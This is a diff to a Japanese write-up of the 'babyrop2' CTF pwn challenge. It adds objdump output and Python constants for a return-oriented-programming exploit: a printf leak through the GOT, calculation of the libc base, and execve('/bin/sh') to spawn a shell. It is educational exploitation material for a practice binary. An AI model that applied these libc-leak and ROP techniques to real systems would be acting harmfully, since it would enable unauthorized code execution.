@@ -268,6 +268,72 @@ rop_pop_rdi = 0x0000000000400733
 rop_pop_rsi = 0x0000000000400731
 ```
 
+### addr_welcome
+
+アドレスのリーク用の"Welcome to the Pwn World again, %s!"の文字列のアドレス。これスカッとアドレスを一発で探す方法は無いんだろうか。
+とりあえずobjdump -sで探している。
+
+```bash-statement
+$ objdump -s ./babyrop2
+Contents of section .rodata:
+ 400750 01000200 00000000 57686174 27732079  ........What's y
+ 400760 6f757220 6e616d65 3f200000 00000000  our name? ......
+ 400770 57656c63 6f6d6520 746f2074 68652050  Welcome to the P
+ 400780 776e2057 6f726c64 20616761 696e2c20  wn World again,
+ 400790 2573210a 00                          %s!..
+$ 
+```
+
+```python
+addr_welcome = 0x400770
+```
+
+### addr_start_main_got
+
+libcのロードアドレスリーク用のGOTアドレス。
+GOTアドレスは実行時に動的に値が設定される。
+objdump -dのコメントで見つけることができる。
+
+
+```bash-statement
+$ objdump -d ./babyrop2
+0000000000400510 <__libc_start_main@plt>:
+  400510:       ff 25 12 0b 20 00       jmpq   *0x200b12(%rip)        # 601028 <__libc_start_main@GLIBC_2.2.5>
+  400516:       68 02 00 00 00          pushq  $0x2
+  40051b:       e9 c0 ff ff ff          jmpq   4004e0 <.plt>
+$
+```
+
+```python
+addr_start_main_got = 0x601028
+```
+
+### addr_printf_plt
+
+アドレスをリークさせるときに呼ぶprintfのアドレス。
+引数にaddr_welcomeとaddr_start_main_gotを渡して%sからstart_mainのロードアドレスを吐かせる。
+objdump -dで調べることができる。
+
+```bash-statement
+$ objdump -d ./babyrop2
+00000000004004f0 <printf@plt>:
+  4004f0:       ff 25 22 0b 20 00       jmpq   *0x200b22(%rip)        # 601018 <printf@GLIBC_2.2.5>
+  4004f6:       68 00 00 00 00          pushq  $0x0
+  4004fb:       e9 e0 ff ff ff          jmpq   4004e0 <.plt>
+$
+```
+
+```python
+addr_printf_plt = 0x00000000004004f0
+```
+
+### addr_main
+
+1回目のオーバーフローで実行したROPが終わったらもう一度mainの最初に戻すたえに使う。
+
+```python
+addr_main = 0x400540
+```
 
 ### addr_libc_start_main
 start_main関数のlibc上でのアドレス。
@@ -286,7 +352,7 @@ addr_libc_start_main = 0x0000000000020740
 
 ### addr_libc_execve、
 execveのlibc上でのアドレス。
-このアドレスとlibcがロードされているアドレスを足せばexecveがロードされているアドレスが分かるのでexecve("/bin/sh")ができる。
+このアドレスとlibcがロードされているアドレスを足せばexecveがロードされているアドレスaddr_execveが分かるのでexecve("/bin/sh")ができる。
 
 調べ方は`objdump -d libc.so.6`して出てきたコード上のアドレスを探すだけ。
 
@@ -322,26 +388,19 @@ addr_libc_binsh = 0x18cd57
 
 ### 残り
 
+後はいろいろもろもろリークさせたアドレスから計算。
 
-addr_start_main_got = 0x601028
 
-addr_main = 0x400540
-
-addr_printf_plt = 0x00000000004004f0
-addr_welcome = 0x400770
-
-rop_pop_rdi = 0x0000000000400733
-rop_pop_rsi = 0x0000000000400731
-
+```python
 addr_start_main= buf[32:38] + b"\x00\x00"
 addr_start_main = pwn.u64(addr_start_main)
 addr_offset = addr_start_main - addr_libc_start_main
 addr_execve = addr_offset + addr_libc_execve
 addr_binsh = addr_offset + addr_libc_binsh
-
+```
 
 ## 参考
 
-- 
+- [sCTF 2016 Q1 writeup - yuta1024's diary](http://yuta1024.hateblo.jp/entry/2016/04/29/215700)
 
 	
